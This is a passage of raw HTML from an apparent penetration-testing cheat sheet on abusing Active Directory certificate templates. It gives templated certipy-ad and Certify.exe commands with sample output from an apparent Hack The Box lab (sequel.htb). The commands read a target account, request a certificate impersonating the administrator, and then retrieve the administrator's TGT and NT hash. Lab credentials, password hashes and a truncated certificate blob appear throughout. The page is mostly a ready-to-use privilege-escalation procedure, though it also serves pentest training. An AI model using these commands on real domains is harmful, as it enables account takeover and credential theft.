</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-29T11:25:07+00:00
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'ryan.cooper@sequel.htb'</span> -hashes <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -k -target <span class="s1">'dc.sequel.htb'</span> -dc-ip <span class="s1">'10.129.33.22'</span> -dc-host dc.sequel.htb -ns 10.129.33.22 -user <span class="s1">'administrator'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'Administrator':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 1114624
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2022-11-18T17:11:51+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-29T11:25:07+00:00
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'ryan.cooper@sequel.htb'</span> -k -target <span class="s1">'dc.sequel.htb'</span> -dc-ip <span class="s1">'10.129.33.22'</span> -dc-host dc.sequel.htb -ns 10.129.33.22 -user <span class="s1">'administrator'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'Administrator':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 1114624
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2022-11-18T17:11:51+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-29T11:25:07+00:00
</span></span></span></div></pre></div><h4 id="2-request-certificate-for-the-target-user">2. Request Certificate for the Target User</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -key-size 4096 -sid <span class="o editable-keyword">&lt;SID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper'</span> -p <span class="s1">'NuclearMosquito3'</span> -target dc.sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size <span class="m">4096</span> -sid S-1-5-21-4078382237-1492182817-2568127209-500
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 22
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -key-size 4096 -sid <span class="o editable-keyword">&lt;SID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper'</span> -hashes <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -target dc.sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size <span class="m">4096</span> -sid S-1-5-21-4078382237-1492182817-2568127209-500
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 23
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -key-size 4096 -sid <span class="o editable-keyword">&lt;SID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper@sequel.htb'</span> -p <span class="s1">'NuclearMosquito3'</span> -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size <span class="m">4096</span> -sid S-1-5-21-4078382237-1492182817-2568127209-500
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 24
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -key-size 4096 -sid <span class="o editable-keyword">&lt;SID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper@sequel.htb'</span> -hashes <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size <span class="m">4096</span> -sid S-1-5-21-4078382237-1492182817-2568127209-500
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 25
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> -key-size 4096 -sid <span class="o editable-keyword">&lt;SID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'ryan.cooper@sequel.htb'</span> -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size <span class="m">4096</span> -sid S-1-5-21-4078382237-1492182817-2568127209-500
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 26
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; certipy-ad auth -pfx <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s 10.129.33.22 <span class="o">&amp;&amp;</span> certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.33.22
</span></span><span class="line"><span class="cl"><span class="go">[sudo] password for kali: 
</span></span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN UPN: 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'administrator@sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'administrator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set5" data-tabcontent="tab2"><h4 id="1-set-subject-alternative-name-san">1. Set Subject Alternative Name (SAN)</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\Certify.exe request --ca <span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;CA&gt;</span> --template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> --upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Ryan.Cooper\Documents&gt; .\Certify.exe request --ca SEQUEL.HTB\sequel-DC-CA --template UserAuthentication --upn administrator
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   _____          _   _  __          
</span></span></span><span class="line"><span class="cl"><span class="go">  / ____|        | | (_)/ _|         
</span></span></span><span class="line"><span class="cl"><span class="go"> | |     ___ _ __| |_ _| |_ _   _    
</span></span></span><span class="line"><span class="cl"><span class="go"> | |    / _ \ '__| __| |  _| | | |   
</span></span></span><span class="line"><span class="cl"><span class="go"> | |___|  __/ |  | |_| | | | |_| |   
</span></span></span><span class="line"><span class="cl"><span class="go">  \_____\___|_|   \__|_|_|  \__, |   
</span></span></span><span class="line"><span class="cl"><span class="go">                             __/ |   
</span></span></span><span class="line"><span class="cl"><span class="go">                            |___./   
</span></span></span><span class="line"><span class="cl"><span class="go">  v2.0.0                         
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Request a certificate
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Current user context    : sequel\Ryan.Cooper
</span></span></span><span class="line"><span class="cl"><span class="go">[*] No subject name specified, using current context as subject.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Template                : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Subject Alt Name(s)     : administrator
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate Authority   : SEQUEL.HTB\sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">[*] CA Response             : The certificate has been issued.
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID              : 27
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Certificate (PFX)       :
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---IAeQBhAG4ALgBDAG8AbwBwAGUAcgAAAAAAAAAAAAAAAAAAAAA=
